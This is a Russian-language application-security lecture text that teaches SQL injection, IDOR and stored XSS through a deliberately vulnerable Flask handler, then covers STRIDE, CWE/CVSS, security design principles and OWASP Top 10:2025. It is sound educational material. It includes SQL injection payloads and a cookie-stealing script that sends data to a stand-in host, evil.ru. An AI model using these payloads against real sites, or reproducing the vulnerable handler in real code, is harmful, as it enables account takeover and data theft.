# 1. Зачем это нужно: три дыры в трёх строках кода

## 1.1 Код

Перед вами обработчик страницы профиля — обычный фрагмент из учебной лабораторной:

```python
@app.route("/profile")
def profile():
    user_id = request.args.get("id")                       # ①  берём id из URL
    row = db.execute(                                      # ②  идём в базу
        "SELECT name, email, phone FROM users WHERE id = " + user_id
    )
    return render(f"<h1>Привет, {row.name}</h1>"           # ③  рисуем страницу
                  f"<p>{row.email} · {row.phone}</p>")
```

Код работает. Тесты проходят. Лабораторная сдана.

**Прежде чем читать дальше, попробуйте сами найти здесь проблемы безопасности.** Их три, по одной в каждой пронумерованной строке.

## 1.2 Что происходит, когда открывается эта страница

1. Пользователь открывает `https://site.ru/profile?id=17`.
2. Браузер отправляет HTTP-запрос. В нём путь, параметры (`id=17`) и cookie с идентификатором сессии.
3. Сервер достаёт `id` из URL, склеивает SQL-запрос, отправляет его в базу.
4. База возвращает строку, сервер подставляет её в HTML, браузер показывает страницу.

Запомните главное: **всё, что перечислено в пункте 2, формирует клиент.** Не ваш код и не ваш сервер. И клиентом не обязательно является браузер — запрос можно отправить из `curl`, Postman или Burp Suite, где никакой ваш JavaScript не выполняется.

## 1.3 Дыра №1 — SQL-инъекция (строка ②)

![Схема 3. Почему данные становятся кодом](03-sql-injection.svg)

**Нормальный случай.** Пользователь запросил `?id=17`, код склеил строку и получил:

```sql
SELECT name, email, phone FROM users WHERE id = 17
```

База нашла пользователя 17 и вернула одну строку.

**А если параметр — не число.** Злоумышленник открывает `?id=1 OR 1=1`. Никто не проверял, что там число, и код честно склеивает:

```sql
SELECT name, email, phone FROM users WHERE id = 1 OR 1=1
```

Разберитесь, **почему** это работает — здесь суть всего класса уязвимостей:

- Для вашей программы `1 OR 1=1` — это **данные**, строка, которую она куда-то вставила.
- Для СУБД пришла **одна готовая команда**, и она разбирает её целиком. Слова `OR` и `1=1` для неё — синтаксис языка, а не текст.
- Граница между «запросом» и «данными пользователя» существовала только в голове программиста. В переданной строке её нет.

Условие `id = 1 OR 1=1` истинно для каждой строки таблицы, потому что `1=1` истинно всегда. База возвращает **всех пользователей**.

**Насколько далеко это заходит.** `OR 1=1` — только начало:

```
?id=-1 UNION SELECT login, password_hash, NULL FROM admins
     → приклеиваем к результату строки из совсем другой таблицы

?id=1; UPDATE users SET is_admin=1 WHERE id=5 --
     → пишем в базу; -- отсекает остаток исходного запроса

?id=1 AND (SELECT COUNT(*) FROM secret_table) > 0
     → «слепая» инъекция: результата не видно, но по тому,
       вернулась страница или ошибка, база читается по одному биту
```

Всё это автоматизировано (`sqlmap`) и не требует ни знания вашего кода, ни доступа к серверу.

**Чем это НЕ лечится.** Типичные, но неверные ответы:

| Предложение | Почему не работает |
|---|---|
| «Запретим слово `OR` и кавычки» | Чёрный список. Обходится регистром, комментариями `/**/`, кодированием, юникодом. Перечислить всё плохое невозможно. |
| «Будем экранировать кавычки» | Помогает только для строк и только если не забыть ни в одном из 200 мест. В нашем примере параметр вообще без кавычек — экранировать нечего. |
| «Поставим WAF» | Сетевой фильтр перед приложением. Полезный дополнительный слой, но он не знает вашей логики и обходится. Это пластырь, дающий время, а не исправление. |

**Чем лечится — параметризованный запрос:**

```python
row = db.execute(
    "SELECT name, email, phone FROM users WHERE id = %s", (user_id,)
)
```

Важен механизм, а не форма записи: **текст запроса и данные передаются в базу отдельными полями протокола.** СУБД сначала разбирает и планирует запрос — в этот момент пользовательских данных ещё нет, — и только потом подставляет значение. Значение параметра **физически не может** стать частью команды. База получит «найди пользователя с идентификатором `1 OR 1=1`», не найдёт такого и вернёт ноль строк.

Разница качественная: экранирование пытается обезвредить опасную строку, параметризация убирает саму возможность.

## 1.4 Дыра №2 — никто не проверил права (строка ①)

![Схема 8. Аутентификация ≠ авторизация](08-idor.svg)

Здесь самое важное наблюдение всего конспекта: **инъекция не нужна вообще.**

Иванов вошёл на сайт под своей учётной записью (её `id = 17`), открыл свой профиль по адресу `/profile?id=17`, а потом просто исправил в адресной строке `17` на `18`. Никакого «взлома», никаких спецсимволов — синтаксически безупречный запрос.

Что сделает код? Возьмёт `id=18`, сходит в базу, вернёт профиль Петрова: телефон, почту, адрес. Приложение при этом **работает абсолютно штатно**.

**Почему так вышло.** Различайте два понятия:

- **Аутентификация** — «кто ты». Проверка сессии: пользователь вошёл, это Иванов. Эта проверка была.
- **Авторизация** — «что тебе можно». Проверка, что запрошенный объект принадлежит именно этому пользователю. Этой проверки не было вообще.

Уязвимость называется **IDOR** (Insecure Direct Object Reference, небезопасная прямая ссылка на объект) и относится к категории **A01:2025 Broken Access Control** — первое место в мировой статистике с 2017 года и до сих пор.

**Почему это опаснее инъекции:**

1. Эксплуатация тривиальна — доступна человеку без всяких навыков, иногда происходит случайно.
2. Перебор `id = 1…100000` автоматизируется одной строкой на bash и выгружает всю базу клиентов. Именно так утекает большинство «баз» из новостей.
3. В журналах это выглядит как нормальная работа: авторизованный пользователь открывал страницы. Ничего не «упало», сигналов тревоги нет.

**Чего делать не надо:**

- *Убрать ссылку из интерфейса, спрятать кнопку.* Интерфейс к запросу отношения не имеет — им можно не пользоваться.
- *Сделать `id` случайным UUID.* Угадать сложнее, но это **сокрытие, а не защита**: идентификатор утечёт через пересланную ссылку, историю браузера, заголовок `Referer`, чужой скриншот. Как дополнительный слой — да, как единственный — нет.

**Как правильно:**

```python
row = db.execute(
    "SELECT name, email, phone FROM users "
    "WHERE id = %s AND owner_id = %s",       # объект + владелец
    (user_id, session.user_id)
)
if row is None:
    log.warning("access denied", user=session.user_id, target=user_id)
    abort(403)
```

Проверка выполняется **на сервере**, **при каждом запросе**, **для каждого объекта**. Отказ пишется в журнал: всплеск отказов и есть признак перебора.

## 1.5 Дыра №3 — XSS (строка ③)

![Схема 4. Хранимая XSS](04-stored-xss.svg)

Третья дыра работает, даже когда первые две закрыты.

Пусть пользователь может задать себе имя — обычная функция любого сайта. Один из пользователей вводит в поле «имя» не имя:

```html
<script>fetch('http://evil.ru/?c=' + document.cookie)</script>
```

Сервер честно сохраняет это в базу — для базы это просто строка, ничего опасного. Дальше кто-то (например, администратор) открывает страницу этого пользователя. Код в строке ③ подставляет сохранённое «имя» прямо в HTML, и браузер администратора получает:

```html
<h1>Привет, <script>fetch('http://evil.ru/?c=' + document.cookie)</script></h1>
```

**Что происходит в браузере.** Браузер не знает, что часть страницы пришла из базы, а часть написал программист. Для него это единый HTML-документ, и `<script>` в нём означает «выполни этот код». Он и выполняет — **в браузере администратора, от его имени, внутри его сессии**.

Скрипт читает `document.cookie` (там идентификатор сессии администратора) и отправляет его на сервер злоумышленника. Тот подставляет эту cookie себе и заходит на сайт как администратор. **Пароль не понадобился, второй фактор тоже.**

Разберите последовательность по шагам:

| Шаг | Кто действует | Что происходит |
|---|---|---|
| 1 | Злоумышленник | сохраняет скрипт в поле «имя» |
| 2 | Жертва | открывает обычную страницу сайта |
| 3 | Сервер | отдаёт HTML, внутри которого лежит чужой скрипт |
| 4 | Браузер жертвы | выполняет скрипт и отправляет cookie на `evil.ru` |
| 5 | Злоумышленник | входит на сайт как жертва |

Обратите внимание: **код злоумышленника выполнился не на сервере.** Сервер всё это время работал штатно, в его журналах — обычные запросы. Пострадал третий человек, который просто открыл страницу.

**Три вида XSS:**

- **хранимая (stored)** — как в примере: нагрузка лежит в базе и срабатывает у каждого, кто откроет страницу. Самая опасная;
- **отражённая (reflected)** — нагрузка в URL, срабатывает у того, кого заманили по ссылке;
- **DOM-based** — сервер вообще ни при чём, скрипт собирает страницу из фрагмента URL на стороне клиента.

**Чем лечится:**

1. **Кодирование вывода под контекст.** При вставке в HTML символы `< > & " '` превращаются в `&lt; &gt; &amp;` — браузер покажет их как текст и не увидит тега. Современные шаблонизаторы (Jinja, Twig, React) делают это автоматически; дыра появляется там, где разработчик явно это отключил (`|safe`, `dangerouslySetInnerHTML`).
2. **Флаг `HttpOnly` у cookie сессии** — тогда `document.cookie` её не увидит и украсть скриптом не получится.
3. **`Content-Security-Policy`** — запрет на выполнение сторонних и встроенных скриптов. Второй эшелон на случай, если первый пробит.

Ключевая мысль, к которой вернёмся в разделе 4: экранировать надо **при выводе**, а не «при вводе». Одна и та же строка безопасна в тексте HTML, но опасна внутри `<script>` или в атрибуте — правила разные, и знает их только то место, куда данные уходят.

## 1.6 Итог раздела

| Строка | Уязвимость | Что нарушено | Категория OWASP 2025 | CWE |
|---|---|---|---|---|
| ② | SQL-инъекция | данные стали кодом | A05 Injection | CWE-89 |
| ① | IDOR | нет проверки прав | A01 Broken Access Control | CWE-639 |
| ③ | Хранимая XSS | вывод не закодирован | A05 Injection | CWE-79 |

Четыре вывода:

1. **Ни один из трёх дефектов не является ошибкой в привычном смысле.** Код компилируется, работает, проходит тесты, делает ровно то, что написано. Обычное тестирование их не находит: QA проверяет счастливый сценарий, а атакующий ищет несчастливый.
2. **Уязвимости не «залезли» извне.** Их написал разработчик — не по злому умыслу, а потому что представлял себе доброжелательного пользователя.
3. **Причина у всех трёх одна:** данные, пришедшие от клиента, были использованы без проверки — как часть SQL-команды, как указание, что показать, как часть HTML-страницы.
4. **Три строки кода — три разные категории OWASP.** В реальном приложении таких строк десятки тысяч.

Вот тот же обработчик, в котором закрыты все три дыры:

```python
@app.route("/profile")
def profile():
    user_id = request.args.get("id", type=int)          # ① белый список: только число
    if user_id is None:
        abort(400)

    row = db.execute(                                   # ② параметризованный запрос
        "SELECT name, email, phone FROM users "
        "WHERE id = %s AND owner_id = %s",              #    + проверка владения
        (user_id, session.user_id)
    )
    if row is None:
        log.warning("access denied", user=session.user_id, target=user_id)
        abort(403)                                      #    отказ по умолчанию + журнал

    return render_template("profile.html", user=row)    # ③ шаблонизатор кодирует вывод
```

# 2. Что такое безопасность приложений

## 2.1 Определение

**Безопасность приложения (application security, AppSec)** — свойство приложения сохранять заданные характеристики (конфиденциальность, целостность, доступность обрабатываемой информации) при *преднамеренных* воздействиях нарушителя, а также совокупность инженерных мер по обеспечению этого свойства на всех этапах жизненного цикла ПО.

Ключевое слово — **преднамеренных**. Этим безопасность отличается от надёжности:

| | Надёжность (reliability) | Безопасность (security) |
|---|---|---|
| Природа воздействия | Случайная: сбой диска, ошибка ввода | Целенаправленная, разумный противник |
| Распределение входов | Типичное, «средний» пользователь | Наихудшее, специально подобранное |
| Метрика | Вероятность отказа | Стоимость атаки для нарушителя |
| Что проверяем | «Работает ли, когда всё хорошо» | «Ломается ли, когда всё плохо» |

Отсюда практический вывод: **обычное тестирование уязвимости не находит.**

> **Формулировка, которую стоит запомнить:** функциональные требования описывают, что программа должна делать. Безопасность — это про то, чего она делать не должна.

## 2.2 Триада КЦД (CIA)

Классическая модель свойств, которые мы защищаем:

- **Конфиденциальность (Confidentiality)** — данные видит только тот, кому положено. Нарушение: утечка базы, чужой профиль из раздела 1.4.
- **Целостность (Integrity)** — данные меняет только тот, кому положено, и только предусмотренным образом. Нарушение: подмена суммы платежа, дефейс сайта, подделка JWT.
- **Доступность (Availability)** — сервис работает для легитимных пользователей. Нарушение: DDoS, «положили» базу тяжёлым запросом, шифровальщик.

Дополняют триаду (модель Паркера, «гексада»); в веб-приложениях особенно важны:

- **Аутентичность** — субъект тот, за кого себя выдаёт;
- **Неотказуемость (non-repudiation)** — пользователь не может отрицать совершённое действие (журналы, электронная подпись);
- **Подотчётность (accountability)** — каждое действие связано с конкретным субъектом.

**Упражнение.** Для каждого инцидента определите нарушенное свойство: утечка данных клиентов; накрутка баланса в личном кабинете; магазин недоступен в чёрную пятницу; из журнала удалены записи об операции.

## 2.3 Словарь

Эти пять слов постоянно путают. Разберите их по схеме:

![Схема 1. Кто на кого действует](01-risk-chain.svg)

- **Актив (asset)** — то, что мы защищаем и что имеет ценность: персональные данные, деньги, репутация, доступность сервиса, исходный код.
- **Угроза (threat)** — потенциальное нежелательное событие: «кража базы клиентов». Существует всегда, независимо от нашего кода.
- **Нарушитель, модель нарушителя (threat actor)** — кто именно: скучающий скрипт-кидди, конкурент, инсайдер, организованная преступность, спецслужба. У них разные бюджеты и мотивы; защита от разных нарушителей стоит по-разному.
- **Уязвимость (vulnerability)** — конкретный дефект в нашей системе, который позволяет угрозе реализоваться: та самая склейка строки в SQL.
- **Эксплойт (exploit)** — код или последовательность действий, использующая уязвимость.
- **Вектор атаки** — путь доставки: форма поиска, загрузка аватара, публичный API.
- **Поверхность атаки (attack surface)** — сумма всех точек, куда нарушитель может подать вход: все эндпоинты, параметры, порты, зависимости. Чем меньше — тем лучше.
- **Риск** — ожидаемый ущерб: вероятность реализации × размер ущерба. Управляют именно риском: его можно **снизить** (исправить), **передать** (страховка, аутсорс), **избежать** (убрать функциональность) или **принять** (осознанно жить с ним).

> **Абсолютной безопасности не бывает.** Задача не «сделать неломаемое», а сделать так, чтобы стоимость атаки заметно превышала ценность актива, а успешная атака была обнаружена и ограничена в последствиях.

## 2.4 Граница доверия

**Граница доверия (trust boundary)** — линия, на которой данные переходят из-под контроля злоумышленника в вашу зону. В веб-приложении она проходит по HTTP-запросу (схема 2 в разделе 1.2).

Слева от неё — всё, что редактируется за секунды: URL, параметры формы, cookie, заголовки, тело JSON, имя и тип загружаемого файла, `User-Agent`. Проверить это можно прямо в браузере: откройте DevTools (F12), удалите у поля формы атрибут `required` или `maxlength` и отправьте её. Работает всегда.

Отсюда правило, которое не имеет исключений: **валидация на клиенте — это удобство для пользователя, а не защита.** Всё, что важно, проверяется на сервере.

# 3. Классификация опасностей

Одну и ту же уязвимость можно классифицировать по разным основаниям. Классификаций много, потому что у них разные задачи: одна нужна разработчику, другая аналитику, третья руководителю.

## 3.1 По природе воздействия

- **Естественные** — пожар, наводнение в дата-центре. Относятся к доступности.
- **Техногенные** — отказ оборудования, ошибка конфигурации, программный дефект.
- **Антропогенные** — умышленные действия человека. Основной предмет нашей темы.

## 3.2 По источнику относительно системы

- **Внешние** — анонимный пользователь из интернета.
- **Внутренние (инсайдер)** — сотрудник, подрядчик, бывший работник с невыключенным доступом. Статистически дают меньший объём, но больший ущерб на инцидент: у инсайдера уже есть доступ и знание системы.
- **Цепочка поставок** — не ваш код и не ваш сотрудник, а библиотека, подрядчик или система сборки. В 2025 году выделена в отдельную категорию OWASP именно потому, что перестала быть экзотикой.

## 3.3 По этапу жизненного цикла, на котором возник дефект

Самое полезное для разработчика деление:

- **Flaw — дефект проектирования.** Например, восстановление пароля по вопросу «девичья фамилия матери». Код написан идеально, архитектура неверна. Исправляется только переделкой. Примерно половина всех проблем.
- **Bug — дефект реализации.** Забыли экранировать, перепутали `==` и `===`, оставили отладочный эндпоинт. Исправляется патчем.
- **Дефект конфигурации и эксплуатации.** Пароль `admin/admin`, открытая наружу админка, включённый листинг директорий, публичный облачный бакет.

**Чем раньше по жизненному циклу возник дефект, тем дороже его исправить.** Ошибка проектирования, найденная на проде, стоит на один-два порядка дороже, чем найденная на этапе требований (см. раздел 6).

## 3.4 По слою архитектуры

| Слой | Типичные опасности |
|---|---|
| Клиент (браузер) | XSS, CSRF, clickjacking, хранение токенов в `localStorage` |
| Транспорт | Отсутствие или неверная настройка TLS, MITM, перехват cookie без флага `Secure` |
| Логика приложения | Контроль доступа, IDOR, ошибки бизнес-логики, состояния гонки |
| Данные | SQL- и NoSQL-инъекции, слабое хеширование паролей, хранение в открытом виде |
| Платформа, ОС, контейнер | Конфигурация, устаревшие пакеты, лишние открытые порты |
| Цепочка поставок, CI/CD | Скомпрометированные зависимости, украденные токены сборки |
| Человек | Фишинг, социальная инженерия, слабые пароли |

Последняя строка — не шутка. Самое уязвимое звено обычно не техническое.

## 3.5 STRIDE — классификация угроз по типу нарушения

Модель Microsoft, применяется при **моделировании угроз**. Каждая буква — тип угрозы и «зеркальное» ей защитное свойство:

| Буква | Угроза | Нарушает | Контрмера |
|---|---|---|---|
| **S** | Spoofing — подмена личности | Аутентичность | Аутентификация, MFA |
| **T** | Tampering — искажение данных | Целостность | Подписи, хеши, валидация, транзакции |
| **R** | Repudiation — отказ от действий | Неотказуемость | Журналирование, электронная подпись |
| **I** | Information disclosure — раскрытие | Конфиденциальность | Шифрование, контроль доступа |
| **D** | Denial of service — отказ в обслуживании | Доступность | Лимиты, квоты, кэш, масштабирование |
| **E** | Elevation of privilege — рост привилегий | Авторизация | Наименьшие привилегии, проверка на сервере |

**Как этим пользоваться.** Возьмите любую функцию (например, форму входа), нарисуйте поток данных от пользователя к серверу и по каждой букве задайте вопрос: может ли злоумышленник выдать себя за другого? исказить данные? отпереться от действия? прочитать лишнее? уронить сервис? повысить свои права? Шесть вопросов к каждому потоку данных — и получается список угроз без всякой магии. Это и есть моделирование угроз в простейшем виде.

Родственные модели, о которых достаточно знать: **DREAD** (оценка серьёзности), **PASTA**, **LINDDUN** (для приватности), **MITRE ATT&CK** и *kill chain* (описывают ход атаки, а не дефект).

## 3.6 Отраслевые каталоги: CWE, CVE, CVSS, CAPEC

Эти четыре аббревиатуры надо различать — их спрашивают на собеседованиях.

- **CWE (Common Weakness Enumeration)** — каталог **типов** слабостей, «класс болезни». Например, CWE-89 «SQL Injection», CWE-79 «XSS», CWE-22 «Path Traversal». Более 900 записей. Существует подборка **CWE Top 25 Most Dangerous Software Weaknesses**.
- **CVE (Common Vulnerabilities and Exposures)** — идентификатор **конкретной** уязвимости в **конкретном** продукте, «диагноз пациента». Например, CVE-2021-44228 (Log4Shell). Формат: `CVE-год-номер`. Реестры: NVD, OSV, БДУ ФСТЭК России.
- **CVSS (Common Vulnerability Scoring System)** — метрика серьёзности от 0 до 10, текущая версия 4.0. Оценивает вектор атаки, сложность, требуемые привилегии, влияние на КЦД. Важно: **CVSS — это не риск.** Критичная по CVSS дыра в системе без данных менее опасна, чем средняя дыра в платёжном шлюзе. Дополняют её **EPSS** (вероятность эксплуатации) и **CISA KEV** (список реально эксплуатируемых уязвимостей).
- **CAPEC** — каталог **шаблонов атак** (как атакуют), в дополнение к CWE (что сломано).

Связка одной фразой: *«Уязвимость **CVE**-2021-44228 — это экземпляр слабости **CWE**-917, эксплуатируемый по шаблону **CAPEC**-137, с оценкой **CVSS** 10.0»*.

**OWASP Top 10** в этой системе координат — не стандарт и не каталог, а **список категорий рисков, агрегированных из статистики CWE**; документ по повышению осведомлённости.

## 3.7 По последствиям

Так безопасность обосновывают руководству:

- прямые финансовые потери — кража средств, простой;
- утечка персональных данных → ответственность перед регулятором (в РФ — штрафы за нарушение обработки ПДн и оборотные штрафы за утечки, в ЕС — GDPR);
- репутационный ущерб и отток клиентов;
- юридические последствия и претензии контрагентов;
- компрометация клиентов — сайт становится инструментом атаки на посетителей.

# 4. Принципы построения безопасных систем

**Уязвимости меняются каждый год, принципы — нет.** Восемь из перечисленных ниже сформулированы Джеромом Зальцером и Майклом Шрёдером ещё в 1975 году и не устарели.

## 4.1 Классические принципы (Saltzer & Schroeder, 1975)

**1. Экономия механизма (economy of mechanism).**
Защитный механизм должен быть максимально простым, чтобы его можно было полностью проверить. Сложность — главный враг безопасности. Самописная «умная» система прав с сорока флагами гарантированно содержит дыру; три роли — нет.

**2. Отказ по умолчанию (fail-safe defaults, deny by default).**
По умолчанию доступ **запрещён**; разрешения выдаются явно. Разница принципиальна: в чёрном списке вы должны предугадать всё плохое (и однажды не предугадаете), в белом — перечислить всё хорошее.
*Правило для кода:* валидация входа — **всегда белый список** (`^[0-9]{1,6}$`), а не «вырезать плохие символы».

**3. Полное посредничество (complete mediation).**
Каждое обращение к каждому объекту проверяется **каждый раз**. Не «проверили при входе в раздел, дальше доверяем». Решение об авторизации не кэшируется. Нарушение этого принципа и даёт уязвимость №1 в мире — Broken Access Control.

**4. Открытое проектирование (open design), принцип Керкгоффса.**
Безопасность не должна зависеть от секретности алгоритма — только от секретности ключа. **Security through obscurity ≠ security.** Скрытая админка по адресу `/adm1n_secret/` будет найдена сканером за минуту. Прятать можно, но как второй слой, а не как единственный.

**5. Разделение привилегий (separation of privilege).**
Для критичного действия нужно больше одного условия: двухфакторная аутентификация, подтверждение платежа вторым сотрудником, ревью пул-реквеста другим человеком.

**6. Наименьшие привилегии (least privilege).**
Каждый компонент и субъект имеет минимум прав, необходимый для работы, и минимум времени. Веб-приложению не нужен пользователь БД с правом `DROP TABLE`; сервису отчётов достаточно read-only реплики; контейнер не должен работать от root.

**7. Минимум общих механизмов (least common mechanism).**
Меньше разделяемых между пользователями ресурсов — меньше каналов утечки и взаимного влияния. Современное прочтение: изоляция арендаторов (multi-tenancy), отдельные пространства имён, отдельные ключи шифрования на клиента.

**8. Психологическая приемлемость (psychological acceptability).**
Если защита неудобна, её обойдут. Требование менять пароль каждые 30 дней рождает `Пароль_Сентябрь1!` на стикере под клавиатурой. Современные рекомендации (в т. ч. NIST SP 800-63B) — длинные парольные фразы, проверка по спискам утечек, MFA — и **без** принудительной ротации без причины. Безопасный путь должен быть самым лёгким путём.

## 4.2 Современные дополнения

**9. Эшелонированная защита (defense in depth).**
Не одна стена, а несколько независимых слоёв, каждый из которых построен так, будто предыдущий уже пробит. Ни один слой не считается достаточным.

![Схема 7. Эшелонированная защита](07-defense-in-depth.svg)

*Проверьте себя:* какой слой на этой схеме остановил бы каждую из трёх дыр из раздела 1?

**10. Безопасный отказ (fail securely, fail closed).**
Когда что-то ломается, система должна закрываться, а не открываться. Классический антипаттерн:

```python
try:
    is_admin = check_permissions(user)   # бросил исключение
except:
    is_admin = True                      # катастрофа
```

Сюда же — полный откат незавершённой транзакции, а не «половина платежа прошла». Этому посвящена новая категория **A10:2025**.

**11. Безопасность по умолчанию (secure by default).**
«Из коробки» конфигурация должна быть безопасной: HTTPS включён, отладка выключена, учётных записей по умолчанию нет, приватность включена. Пользователь не обязан быть экспертом, чтобы не пострадать.

**12. Минимизация поверхности атаки.**
Каждая неиспользуемая функция, эндпоинт, параметр, порт и библиотека — это долг. Удалённый код не имеет уязвимостей.

**13. Вход валидируем, вывод кодируем.**
Две **разные** операции, которые постоянно смешивают:

- **Валидация входа** — «это вообще похоже на дату, email, число?» Белый список, на сервере, как можно раньше.
- **Кодирование (экранирование) вывода** — приведение данных к правилам того контекста, куда они уходят: HTML, атрибут HTML, JavaScript, SQL, shell, LDAP, URL. Делается **при выводе**, потому что зависит от приёмника.

Именно поэтому «универсальной очистки данных» не существует: одна и та же строка безопасна в тексте HTML и опасна внутри `<script>`.

**14. Минимизация данных.**
Не собирайте то, что вам не нужно. Данных, которых у вас нет, нельзя лишиться. Сюда же — псевдонимизация, сроки хранения, удаление.

**15. Журналирование и наблюдение.**
Инцидент, который не замечен, длится годами. Логировать: аутентификацию, отказы в доступе, изменения прав, критичные операции. **Не логировать:** пароли, токены, номера карт, полные персональные данные.

**16. Не изобретайте криптографию.**
Используйте проверенные библиотеки и стандартные протоколы. Для паролей — специализированные функции: **Argon2id**, **scrypt**, **bcrypt**, **PBKDF2** с солью; никогда не «MD5 или SHA-256 от пароля» (они быстрые, а для паролей нужна намеренно медленная функция). Для транспорта — TLS 1.2/1.3 актуальной конфигурации. Ключи — в менеджере секретов, а не в коде и не в git.

**17. Zero Trust — «никогда не доверяй, всегда проверяй».**
Расположение в сети не даёт привилегий: запрос из внутренней сети проверяется так же, как из интернета. Особенно актуально для микросервисов и внутренних API, которые исторически «доверяли друг другу».

## 4.3 Пять правил, если запоминать только их

1. Проверяй **на сервере**. Клиент — не наш.
2. **Запрещено по умолчанию**, разрешено явно, проверяется **каждый раз**.
3. **Параметризованные запросы** вместо конкатенации строк. Всегда.
4. **Кодируй вывод** под контекст.
5. **Минимум прав, минимум данных, минимум функций.**

# 5. OWASP Top 10:2025

## 5.1 Что это такое и чем не является

**OWASP (Open Worldwide Application Security Project)** — некоммерческое сообщество, выпускающее открытые материалы по безопасности ПО.

**OWASP Top 10** — список десяти категорий рисков веб-приложений, обновляется примерно раз в 3–4 года. Действующая редакция — **2025**, представлена 6 ноября 2025 года и заменила редакцию 2021 года. В её основе — анализ данных примерно по 2,8 млн приложений и 589 CWE (в 2021 году было около 400), плюс отраслевой опрос практиков: так в список попадают риски, которых ещё нет в статистике, но которые видят специалисты.

Важно понимать:

- Это **документ об осведомлённости, а не стандарт соответствия**. Формально «пройти OWASP Top 10» нельзя.
- Это **категории**, а не отдельные баги: под каждой стоят десятки CWE.
- Для реальной проверки существует **OWASP ASVS** (Application Security Verification Standard) — вот это стандарт с уровнями и требованиями, по нему можно писать чек-лист приёмки.
- Для практики есть **OWASP Cheat Sheet Series** — короткие рецепты «как правильно» по каждой теме.

## 5.3 Что изменилось по сравнению с редакцией 2021

Это важно: в интернете вам будут попадаться материалы по старой редакции.

![Схема 5. Что изменилось между редакциями](05-owasp-2021-2025.svg)

- **Две новые категории:**
  - **A03 Software Supply Chain Failures** — расширение прежней «Vulnerable and Outdated Components» (A06:2021). Теперь это не только «старая библиотека», но весь конвейер: репозитории, сборка, CI/CD, механизм доставки обновлений. Причина повышения — SolarWinds, Log4Shell, червь **Shai-Hulud** в npm (2025, более 500 пакетов, кража токенов разработчиков), атака на кошелёк Bybit (2025, ущерб около 1,5 млрд долларов).
  - **A10 Mishandling of Exceptional Conditions** — полностью новая: ошибки обработки исключений, «fail open», отсутствие отката транзакции, утечка деталей в сообщениях об ошибке.
- **SSRF** (была отдельной категорией A10:2021) **влилась в A01** — сообщество сочло её частным случаем нарушения контроля доступа.
- **Security Misconfiguration** поднялась с 5-го на **2-е** место: конфигурация стала болеть чаще кода.
- **Cryptographic Failures** (2 → 4), **Injection** (3 → 5), **Insecure Design** (4 → 6) сдвинулись вниз. Инъекции не исчезли — просто ORM и параметризованные запросы стали нормой, а вот права доступа по-прежнему пишут руками.
- Переименования: A07 стала просто «Authentication Failures»; A09 — «Logging & **Alerting**» вместо «Monitoring»: мало писать журналы, нужно, чтобы кто-то получил сигнал.
- Общий сдвиг методологии — от симптомов к **корневым причинам**.

**Не изменилось с 2017 года: Broken Access Control — №1.** Это самая устойчивая проблема отрасли.

## 5.4 Разбор категорий

### A01. Broken Access Control

**Суть:** аутентификация отвечает «кто ты», авторизация — «что тебе можно». Ломается второе (см. раздел 1.4).

**Типовые проявления:**

- **IDOR** — `/api/orders/1043` → меняем на `1044` и видим чужой заказ.
- Отсутствие проверки роли на серверном эндпоинте: кнопку «Удалить» в интерфейсе скрыли, а `POST /admin/delete` работает у всех.
- Обход через метод, регистр или путь: `PUT` вместо `GET`, `/Admin` вместо `/admin`, `../` (path traversal).
- Подделка токена: JWT с `"alg": "none"` или с изменённым `role: admin`.
- **SSRF** — заставить сервер сходить по подконтрольному злоумышленнику адресу, в том числе во внутреннюю сеть (`http://169.254.169.254/` — метаданные облака).

**Защита:** проверка прав **на сервере при каждом запросе**; запрет по умолчанию; проверка «принадлежит ли объект этому пользователю», а не только «залогинен ли он»; непредсказуемые идентификаторы как *дополнительная* мера; централизованный слой авторизации вместо проверок в 200 местах; для SSRF — белый список адресов исхода.

### A02. Security Misconfiguration

**Суть:** код нормальный, настройки — нет.

**Проявления:** учётные записи по умолчанию; включённый debug и трассировка стека на проде; открытая наружу админка, БД, Redis, Elasticsearch; листинг директорий; лишние примеры и тестовые приложения; отсутствующие заголовки безопасности (`Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`); публичный облачный бакет; слишком широкий CORS (`Access-Control-Allow-Origin: *` вместе с credentials).

**Защита:** повторяемая инфраструктура как код; базовая конфигурация безопасности (hardening baseline) и её автоматическая проверка; одинаковые конфигурации dev/stage/prod, различающиеся только секретами; регулярный аудит; удаление всего лишнего.

### A03. Software Supply Chain Failures

**Суть:** ваш код — малая часть того, что реально выполняется. Остальное вы скачали.

**Проявления:** уязвимая или заброшенная зависимость; тайпсквоттинг (`reqeusts` вместо `requests`); компрометация аккаунта мейнтейнера и публикация вредоносной версии; компрометация CI/CD и подмена артефакта сборки; заражённое обновление от вендора.

**Защита:** **SBOM** (перечень компонентов); фиксация версий и lock-файлы; проверка подписей; загрузка только из доверенных зеркал или прокси-репозитория; автоматический контроль CVE (SCA-инструменты: `npm audit`, OWASP Dependency-Check, Trivy); MFA и минимальные права на всей инфраструктуре разработки; поэтапная выкатка обновлений.

### A04. Cryptographic Failures

**Суть:** данные не защищены при хранении и передаче — либо криптография применена неправильно.

**Проявления:** пароли в открытом виде или под быстрым хешем без соли; HTTP вместо HTTPS; самодельные шифры; жёстко зашитые ключи в коде и в git; режим ECB; предсказуемый генератор случайных чисел для токенов; cookie без `Secure`, `HttpOnly`, `SameSite`.

**Защита:** классифицировать данные и защищать по классу; TLS везде плюс HSTS; **Argon2id / bcrypt / scrypt** для паролей; криптостойкий генератор для токенов; управление ключами и их ротация; не хранить лишнего.

### A05. Injection

**Суть:** данные попадают в интерпретатор и становятся кодом (см. разделы 1.3 и 1.5).

**Виды:** SQL и NoSQL, командная инъекция ОС, LDAP, XPath, шаблонизаторы (SSTI), **XSS** (инъекция в HTML/JS браузера).

```python
# уязвимо
db.execute("SELECT * FROM users WHERE name = '" + name + "'")

# безопасно — параметризованный запрос
db.execute("SELECT * FROM users WHERE name = %s", (name,))
```

**Защита:** параметризованные запросы и prepared statements — основная мера; ORM с осторожностью (сырые фрагменты сводят её на нет); белые списки для того, что нельзя параметризовать (имена таблиц, направление сортировки); кодирование вывода по контексту против XSS; `Content-Security-Policy`; не вызывать shell со склеенной строкой.

### A06. Insecure Design

**Суть:** дефект в самой идее. Ни безупречный код, ни WAF не помогут — архитектуру нельзя запатчить.

**Примеры:** восстановление доступа по «секретному вопросу»; отсутствие ограничения на число попыток ввода кода из SMS; корзина, в которой цена приходит с клиента; бизнес-логика, допускающая двойное применение промокода в состоянии гонки.

**Защита:** **моделирование угроз** на этапе проектирования (STRIDE, раздел 3.5); требования безопасности наравне с функциональными; типовые проверенные шаблоны; злоупотребительные сценарии (abuse cases) в дополнение к пользовательским.

### A07. Authentication Failures

